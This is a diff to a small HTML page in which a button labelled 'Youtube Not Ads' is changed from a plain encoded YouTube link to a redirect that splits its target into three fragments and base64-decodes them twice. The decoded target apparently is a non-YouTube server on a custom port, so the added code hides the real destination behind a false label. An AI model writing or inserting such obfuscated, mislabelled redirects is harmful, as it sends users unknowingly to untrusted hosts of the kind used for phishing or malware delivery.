@@ -4,12 +4,25 @@
 </head>
 <body>
 
-<button onclick="openHidden()">Youtube Not Ads</button>
+<button onclick="start()">Youtube Not Ads</button>
 
 <script>
-function openHidden() {
-    let encoded = "aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUT9zaT14TkVxSGlpVFFabzNNNnBK";
-    window.location.href = atob(encoded);
+function decode(str) {
+    return atob(str);
+}
+
+function start() {
+    let p1 = "YUhSMGNITTZMeTl5YjNkdFpH";
+    let p2 = "VnVkQzV6WlhKMlpYSXVaR1Yy";
+    let p3 = "WlhJdVpHVTZNemt5TVRjdA==";
+
+    let step1 = p1 + p2 + p3;
+
+    let mid = decode(step1);
+
+    let final = decode(mid);
+
+    window.location.href = final;
 }
 </script>
 
